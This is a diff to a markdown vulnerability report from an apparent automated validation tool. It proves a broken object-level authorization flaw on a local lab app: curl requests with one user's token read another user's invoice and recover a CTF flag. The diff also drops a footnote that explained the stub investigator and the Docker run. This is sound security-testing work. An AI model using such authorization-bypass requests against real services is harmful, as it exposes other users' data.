@@ -21,13 +21,13 @@ The endpoint authenticates the caller but the handler returns an object fetched 
 ### Proof — live HTTP transcript
 
 ```http
-$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/invoices/1
+$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:49293/api/invoices/1
 -> 200 {"id":1,"owner_id":"user_A","customer":"Acme Corp","amount":1200,"note":"Q3 retainer"}
 
-$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/invoices/2
+$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:49293/api/invoices/2
 -> 200 {"id":2,"owner_id":"user_B","customer":"Globex Inc","amount":9000,"note":"FLAG{bola_user_b_invoice_pwned}"}
 
-$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/me/invoices
+$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:49293/api/me/invoices
 -> 200 [{"id":1,"owner_id":"user_A","customer":"Acme Corp","amount":1200,"note":"Q3 retainer"}]
 
 ```
@@ -37,10 +37,9 @@ $ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/me/inv
 **Flag recovered:** `FLAG{bola_user_b_invoice_pwned}`
 
 ### Run
-- investigator: `stub`  ·  model: `qwen2.5-coder:7b`  ·  sandbox: `docker`  ·  tokens: 1700+380  ·  wall: 0.4s
+- investigator: `stub`  ·  model: `qwen2.5-coder:7b`  ·  sandbox: `subprocess`  ·  tokens: 1700+380  ·  wall: 0.4s
 
 ---
 _The goal isn't more findings. It's fewer findings we can actually prove._
 
 <sub>ProofTrace · reachability-first · LLM-as-investigator · validated against a live instance. PoC || GTFO.</sub>
-<sub>Investigator shown as `stub` = ProofTrace's deterministic offline investigator; the local Ollama model (`qwen2.5-coder:7b`) was still downloading at record time. The **proof is real** either way — the HTTP transcript and flag above come from the live validator running the exploit against this app in Docker, which is what flips the finding to VERIFIED.</sub>
